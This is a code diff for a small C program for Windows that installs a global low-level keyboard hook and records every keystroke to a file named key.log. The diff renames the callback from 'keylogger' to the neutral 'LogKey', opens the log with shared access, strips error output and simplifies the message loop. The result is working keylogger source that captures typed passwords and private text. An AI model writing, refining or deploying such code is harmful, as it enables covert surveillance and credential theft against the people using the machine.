@@ -3,11 +3,12 @@
 #include <winuser.h>
 #include <stdbool.h>
 #include <winbase.h>
+#include <share.h>
 
 HHOOK hookHandle;
 FILE* fp;
 
-LRESULT CALLBACK keylogger(
+LRESULT CALLBACK LogKey(
 	_In_ int    nCode,
 	_In_ WPARAM wParam,
 	_In_ LPARAM lParam
@@ -16,16 +17,13 @@ LRESULT CALLBACK keylogger(
 	if (nCode >= 0) {
 		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
 			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
-			WCHAR keyText[1024];
-			DWORD msg = 1;
-			msg += kbdStruct.scanCode << 16;
+			wchar_t keyText[1024];
+			DWORD code = kbdStruct.scanCode << 16;
 
-			int result = GetKeyNameText(msg, keyText, sizeof(keyText) / sizeof(WCHAR));
+			int result = GetKeyNameText(code, keyText, sizeof(keyText) / sizeof(wchar_t));
 			if (result > 0) {
 				size_t keyTextLen = wcslen(keyText);
-				if (keyTextLen == 0) {
-					fprintf(fp, "[virtual key code: %d]", kbdStruct.vkCode);
-				} else if (keyTextLen == 1) {
+				if (keyTextLen == 1) {
 					fprintf(fp, "%ls", keyText);
 				}
 				else {
@@ -35,26 +33,21 @@ LRESULT CALLBACK keylogger(
 			}
 		}
 	}
-
 	return CallNextHookEx(hookHandle, nCode, wParam, lParam);
 };
 
 int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hInstPrev, PSTR cmdline, int cmdshow) {
-	errno_t err = fopen_s(&fp, "key.log", "w");
-	if (err != 0) {
-		printf("Error while opening log file %d", err);
+	fp = _fsopen("key.log", "w", _SH_DENYNO);
+	if (!fp) {
 		return 1;
 	}
 
-	hookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, &keylogger, NULL, 0);
+	hookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, &LogKey, NULL, 0);
 	
 	MSG msg;
-	bool bRet;
-	while (bRet = GetMessage(&msg, NULL, 0, 0)) {
-		if (bRet) {
-			TranslateMessage(&msg);
-			DispatchMessage(&msg);
-		}
+	while (1) {
+		GetMessage(&msg, NULL, 0, 0);
 	};
+
 	return 0;
 }
